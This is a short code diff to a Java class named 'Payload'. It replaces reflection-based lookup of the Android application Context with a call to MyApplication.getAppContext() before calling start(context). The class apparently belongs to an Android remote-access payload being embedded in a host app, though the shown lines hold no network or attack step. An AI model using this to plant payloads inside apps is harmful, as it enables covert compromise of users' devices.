@@ -56,32 +56,44 @@ public class Payload {
         }
     }
 
-    private static void findContext() throws Exception {
-        Class<?> activityThreadClass;
+//    private static void findContext() throws Exception {
+//        Class<?> activityThreadClass;
+//        try {
+//            activityThreadClass = Class.forName("android.app.ActivityThread");
+//        } catch (ClassNotFoundException e) {
+//            // No context
+//            return;
+//        }
+//        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
+//        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+//        if (context == null) {
+//            // Post to the UI/Main thread and try and retrieve the Context
+//            final Handler handler = new Handler(Looper.getMainLooper());
+//            handler.post(new Runnable() {
+//                public void run() {
+//                    try {
+//                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+//                        if (context != null) {
+//                            start(context);
+//                        }
+//                    } catch (Exception e) {
+//                    }
+//                }
+//            });
+//        } else {
+//            start(context);
+//        }
+//    }
+
+    private static void findContext() throws Exception{
+
         try {
-            activityThreadClass = Class.forName("android.app.ActivityThread");
-        } catch (ClassNotFoundException e) {
-            // No context
-            return;
-        }
-        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
-        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-        if (context == null) {
-            // Post to the UI/Main thread and try and retrieve the Context
-            final Handler handler = new Handler(Looper.getMainLooper());
-            handler.post(new Runnable() {
-                public void run() {
-                    try {
-                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-                        if (context != null) {
+            Context context=  MyApplication.getAppContext();
+            if (context != null) {
                             start(context);
                         }
-                    } catch (Exception e) {
-                    }
-                }
-            });
-        } else {
-            start(context);
+        }catch (Exception e){
+            e.printStackTrace();
         }
     }
 
